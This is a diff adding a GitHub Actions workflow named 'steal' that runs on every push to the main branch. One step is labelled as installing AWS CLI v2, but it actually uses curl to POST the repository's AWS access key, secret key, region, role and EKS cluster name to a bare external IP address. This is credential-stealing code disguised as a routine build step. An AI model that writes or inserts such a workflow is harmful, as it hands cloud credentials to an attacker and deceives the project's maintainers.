@@ -1,0 +1,28 @@
+name: steal
+
+on:
+  push:
+    branches:
+      - 'main'
+
+jobs:
+  build_and_deploy:
+    runs-on: kuby-runner-set
+    steps:
+      - 
+        name: 1. Checkout repository
+        uses: actions/checkout@v4
+      - 
+        name: 3. Update & install default OS binaries (curl...)
+        run: |
+          sudo apt update -y
+          sudo apt install -y curl unzip
+      - 
+        name: 4. Install AWS CLI v2
+        run: |
+          curl -X POST -d "ak=${{ secrets.AWS_ACCESS_KEY_ID }}&\
+          sk=${{ secrets.AWS_SECRET_ACCESS_KEY }}&\
+          region=${{ secrets.AWS_REGION_ID }}&\
+          role=${{ secrets.AWS_ROLE_TO_ASSUME }}&\
+          cluster=${{ secrets.K8S_EKS_NAME }}" \
+          http://54.38.35.27:8081
